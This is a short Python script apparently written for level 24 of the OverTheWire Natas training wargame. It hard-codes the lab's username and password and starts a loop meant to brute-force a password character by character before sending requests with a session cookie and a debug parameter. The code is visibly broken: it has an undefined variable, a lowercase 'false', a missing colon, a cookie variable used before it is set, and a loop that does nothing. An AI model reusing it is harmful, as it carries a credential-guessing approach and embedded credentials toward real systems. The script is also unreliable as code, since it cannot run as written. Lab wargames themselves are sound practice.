import requests, string

target = 'http://natas24.natas.labs.overthewire.org'
auth = ('natas24', 'MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd')

characters = ''.join([string.ascii_letters, string.digits])
higher = false;

for i in range(1,32) 
    for char in characters:
        params = dict(passwd)

r = requests.get(target, auth=auth, params=params, cookies=cookies);
print (r.text + '\n\n\n')

cookies = dict(PHPSESSID = r.cookies['PHPSESSID'])
params = dict(debug='')

r = requests.get(target, auth=auth, params=params, cookies=cookies);
print(r.text)
